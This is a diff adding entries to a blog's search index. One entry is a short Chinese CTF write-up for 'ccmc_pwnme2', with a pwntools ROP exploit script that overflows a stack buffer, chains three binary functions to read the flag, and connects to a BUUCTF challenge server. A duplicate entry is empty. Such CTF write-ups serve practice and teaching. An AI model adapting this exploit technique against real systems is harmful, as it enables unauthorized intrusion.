@@ -4119,4 +4119,41 @@ r.interactive()
         <tag>week</tag>
       </tags>
   </entry>
+  <entry>
+    <title>ccmc_pwnme2</title>
+    <url>/2022/03/16/week3-2.2/</url>
+    <content><![CDATA[<html><head></head><body><p>​        一道看起来人畜无害的栈题。但是有几个非常奇怪的函数。</p>
+<p>​        所以这是一道相对有些奇怪的rop，控制这三个函数的其中两个的参数为指定字符串，就能较为方便地读取flag。</p>
+<pre><code class="python">from pwn import *
+p = remote('node4.buuoj.cn',27653)
+#p = process('./pwnme2')
+pop_edi_ebp_ret= 0x0804867f
+pop_ebp_ret = 0x08048680
+
+add_home = 0x08048644
+add_flag = 0x08048682
+exec_string  = 0x080485CB
+
+payload = b"a"*112  + p32(add_home) + p32(pop_ebp_ret) + p32(0xDEADBEEF) 
+payload += p32(add_flag) + p32(pop_edi_ebp_ret) + p32(0xCAFEBABE) + p32(0xABADF00D) 
+payload += p32(exec_string)
+
+p.send(payload)
+p.interactive()
+</code></pre>
+<p>​    </p>
+<p>​    ps：感觉还需要再多做一些rop</p>
+</body></html>]]></content>
+      <tags>
+        <tag>week</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ccmc_pwnme2</title>
+    <url>/2022/03/16/week3-2.3/</url>
+    <content><![CDATA[]]></content>
+      <tags>
+        <tag>week</tag>
+      </tags>
+  </entry>
 </search>
